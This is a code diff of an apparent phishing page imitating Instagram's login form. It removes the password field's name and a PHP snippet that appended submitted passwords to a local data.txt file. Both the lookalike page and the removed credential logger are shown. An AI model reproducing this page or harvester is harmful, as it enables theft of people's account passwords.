@@ -15,7 +15,7 @@
         <form action="" method="post">
         <img class="insta-box__img" src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="">
         <input type="text" class="insta-box__username" placeholder="Phone number, username, or email">
-        <input type="password" name="textdata" class="insta-box__password" placeholder="Password">
+        <input type="password"  class="insta-box__password" placeholder="Password">
         <input type="submit" value="Log In" class="insta-box__submit">
         </form>
         <div class="insta-box__or">
@@ -37,13 +37,3 @@
 </div>
 </body>
 </html>
-<?php
-              
-if(isset($_POST['textdata']))
-{
-$data=$_POST['textdata'];
-$fp = fopen('data.txt', 'a');
-fwrite($fp, $data);
-fclose($fp);
-}
-?>
